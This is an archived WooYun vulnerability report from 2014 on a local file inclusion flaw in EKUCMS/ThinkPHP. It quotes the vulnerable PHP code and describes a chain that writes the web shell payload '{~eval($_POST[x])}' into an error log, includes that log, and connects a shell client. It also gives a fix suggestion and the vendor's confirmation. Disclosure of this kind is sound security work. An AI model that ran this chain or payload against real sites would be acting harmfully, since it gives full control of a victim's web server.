{"id": 1940, "wybug_id": "wooyun-2014-061639", "wybug_title": "易酷cms本地包含导致getwebshell(ThinkPHP)", "wybug_corp": "ekucms.com", "wybug_author": "Bhunter", "wybug_date": "2014-05-22 15:10", "wybug_open_date": "2014-08-20 15:12", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "文件包含漏洞", "模板文件操作参数未过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向公众公开  简要描述： 通过本地包含直接getwebshell，直接控制整个网站权限。 详细说明：  漏洞文件：core\\Lib\\Action\\Home\\MyAction.class.php\n<?phpclass MyAction extends HomeAction{    public function index(){\t\t$this->show();\t}    public function show(){\t\t$id = !empty($_GET['id'])?$_GET['id']:'hot';\t\t$this->display('my_'.trim($id));漏洞点\t}\t\t\t\t\t}?>\n包含点：\npublic function fetch($templateFile='',$charset='',$contentType='text/html',$display=false)    {        $GLOBALS['_viewStartTime'] = microtime(TRUE);        if(null===$templateFile)            // 使用null参数作为模版名直接返回不做任何输出            return ;        if(empty($charset))  $charset = C('DEFAULT_CHARSET');        // 网页字符编码        header(\"Content-Type:\".$contentType.\"; charset=\".$charset);        header(\"Cache-control: private\");  //支持页面回跳        //页面缓存        ob_start();        ob_implicit_flush(0);        if(!file_exists_case($templateFile))            // 自动定位模板文件            $templateFile   = $this->parseTemplateFile($templateFile);//关键函数，只有此处对包含模板做了文件处理，我看看下这个函数。        $engine  = strtolower(C('TMPL_ENGINE_TYPE'));        if('php'==$engine) {            // 模板阵列变量分解成为独立变量            extract($this->tVar, EXTR_OVERWRITE);            // 直接载入PHP模板            include $templateFile;        }elseif('think'==$engine && $this->checkCache($templateFile)) {            // 如果是Think模板引擎并且缓存有效 分解变量并载入模板缓存            extract($this->tVar, EXTR_OVERWRITE);            //载入模版缓存文件            include C('CACHE_PATH').md5($templateFile).C('TMPL_CACHFILE_SUFFIX');        }else{            // 模板文件需要重新编译 支持第三方模板引擎            // 调用模板引擎解析和输出            $className   = 'Template'.ucwords($engine);            require_cache(THINK_PATH.'/Lib/Think/Util/Template/'.$className.'.class.php');            $tpl   =  new $className;            $tpl->fetch($templateFile,$this->tVar,$charset);        }        $this->templateFile   =  $templateFile;        // 获取并清空缓存        $content = ob_get_clean();        // 模板内容替换        $content = $this->templateContentReplace($content);        // 布局模板解析        $content = $this->layout($content,$charset,$contentType);        // 输出模板文件        return $this->output($content,$display);    }\n对包含文件处理：\nprivate function parseTemplateFile($templateFile) {        if(''==$templateFile) {            // 如果模板文件名为空 按照默认规则定位            $templateFile = C('TMPL_FILE_NAME');        }elseif(strpos($templateFile,'@')){            // 引入其它主题的操作模板 必须带上模块名称 例如 blue@User:add            $templateFile   =   TMPL_PATH.str_replace(array('@',':'),'/',$templateFile).C('TMPL_TEMPLATE_SUFFIX');        }elseif(strpos($templateFile,':')){            // 引入其它模块的操作模板            $templateFile   =   TEMPLATE_PATH.'/'.str_replace(':','/',$templateFile).C('TMPL_TEMPLATE_SUFFIX');        }elseif(!is_file($templateFile))    {            // 引入当前模块的其它操作模板            $templateFile =  dirname(C('TMPL_FILE_NAME')).'/'.$templateFile.C('TMPL_TEMPLATE_SUFFIX');        }        if(!file_exists_case($templateFile))            throw_exception(L('_TEMPLATE_NOT_EXIST_').'['.$templateFile.']');        return $templateFile;    }\n有了包含点，我们需要一个含有我们恶意代码的文件，我们利用thinphp的错误日志记录功能：制造错误：\n\n日志文件：\n\n   漏洞证明：  利用上边说道的两个功能：1.包含任意文件2.错误写入日子3.结合thinkphp的模板语法构造一句话为:{~eval($_POST[x])}写入一句话:制造错误：\n\n日志文件：\n\n包含一句话：\n\n菜刀链接：\n\n   修复方案：  对于程序修复问题，如果从二次开发者的角度说，不应该让模板参数可控。对于thinkphp的角度，在模板文件名和路径处理上需要更加完善。   版权声明：转载请注明来源 Bhunter@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-22 16:14 厂商回复： 感谢提交，我们将通知用户修复此漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-21 13:03 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  一库一库~    \n     2014-06-11 16:31 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  @寂寞的瘦子 。。    \n     2014-06-11 17:10 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  @寂寞的瘦子 瞎子    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}